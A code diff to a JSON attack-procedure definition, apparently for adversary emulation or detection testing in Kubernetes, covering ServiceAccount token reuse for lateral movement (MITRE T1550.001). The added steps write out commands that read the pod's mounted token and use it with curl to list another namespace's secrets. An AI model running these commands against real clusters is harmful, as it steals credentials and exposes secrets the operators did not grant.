@@ -7,7 +7,21 @@
     "id": "PROC-lateral-sa-token",
     "name": "ServiceAccount 토큰 재사용 측면이동",
     "description": "침해한 파드에 자동 마운트된 SA 토큰(/var/run/secrets/kubernetes.io/serviceaccount/token)을 꺼내 kube-apiserver 에 Bearer 인증으로 붙어, 그 SA 권한으로 다른 네임스페이스 리소스에 접근한다.",
-    "status": "AUTHORED"
+    "status": "AUTHORED",
+    "steps": [
+      {
+        "id": "STEP-lateral-read-token",
+        "seq": 1,
+        "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+        "description": "마운트된 SA 토큰 추출"
+      },
+      {
+        "id": "STEP-lateral-use-token",
+        "seq": 2,
+        "command": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets",
+        "description": "그 SA 권한으로 타 네임스페이스($NS) 리소스 접근"
+      }
+    ]
   },
   "preconditions": [
     {
@@ -20,9 +34,17 @@
     {
       "id": "ER-lateral-sa-token-progress",
       "kind": "progress",
-      "outcome": {"id": "AO-lateral-movement", "name": "측면이동"},
+      "outcome": {
+        "id": "AO-lateral-movement",
+        "name": "측면이동"
+      },
       "conditions": [
-        {"channel": "audit", "field": "technique", "operator": "eq", "expected": "T1550.001"}
+        {
+          "channel": "audit",
+          "field": "technique",
+          "operator": "eq",
+          "expected": "T1550.001"
+        }
       ]
     }
   ]
